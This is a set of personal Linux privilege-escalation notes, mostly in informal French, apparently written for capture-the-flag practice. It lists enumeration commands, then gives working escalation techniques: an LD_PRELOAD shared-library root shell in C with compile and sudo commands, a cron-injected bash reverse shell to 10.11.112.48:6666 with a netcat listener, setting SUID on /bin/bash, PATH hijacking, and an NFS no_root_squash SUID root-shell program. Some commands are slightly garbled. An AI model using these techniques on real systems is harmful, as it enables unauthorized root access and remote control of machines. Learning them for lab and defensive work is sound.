	==Repérage:==
hostname
uname -a
/proc/version
/etc/issu
id
ls /etc/passwd | cut -d ":" -f ou | grep home
/etc/shadow
ps aux
ls -la
env
netstat -ano
netstat -ltp
sudo -l



- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size
- `find / -writable 2>/dev/null`
 

find avec -type f 2>/dev/null permet d'avoir un truc plus clean sans montrer les erreurs

- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`
- `find / -perm -u=s -type f 2>/dev/null` will list files that have SUID or SGID bits set.

[
**LD_PRELOAD**

C'est une fonction qui permet à un programme d'utiliser des libraries partager,  avec la variable  env_keep tu peux générer une librarie partager avec ton propre code

Comment-faire matéo ?

-TU check si y'a LD_PRELOAD avec env_keep
-t'écrit un petit programme en C en tant qu'objet partagé
-tu lance le programme en sudo avec le LD qui poite vers ton .so (share object)

ex:

`#include <stdio.h>`  
`#include <sys/types.h>`  
`#include <stdlib.h>`  
  
`void _init() {`  
`unsetenv("LD_PRELOAD");`  
`setgid(0);`  
`setuid(0);`  
`system("/bin/bash");`  
`}`

tu le save en tatata.c et le compile avec gcc dans un so

commande : 
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`![[Pasted image 20241201204056.png]]
hop maintenant tu peux le lancer avec ce que tu veux en sudo

faut quand même lui préciser le LD
`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`![[Pasted image 20241201204248.png]]
[[Crack  etc shadow]]

On peut aussi utiliser les Capabilities 

utilise getcap pour voir les capabilities active 
getcap -r / va générer beaucoup d'erreur 
fautpenser a le 2>/dev/null

SI tu peux toucher au crontab

`#!/bin/bash
`bash -i >& /dev/tcp/10.11.112.48/6666 0>&1`

into netcat

nc -lvnp 6666
gg t root
plus simple  -> `chmod u+s /bin/bash

Variable path

echo $PATH

find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

si t'a pas de dossier que tu peux modif dans path bah ajoute le 

export PATH=/tmp:$PATH
ici on l'ajoute dans tmp

[[path script esc]]

Y'a NFS aussi

si nfs server est installer
il est dans /etc/exports

cat /etc/exports
tu check si y'a un vecteur "no_root_squash"
si il y est tu peux crée un exécutable avec le SUID bit de mis et le run sur la victime

étape 1

sur ta machine showmount -e "ip"

étape 2

tu fait un  mkdir sur l'endroit que tu veux
mount -o rw "ip":"victimedos" /tmp/"dossier"

étape 3

petit script la ou tu la monter

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}
```

puis tu le compile


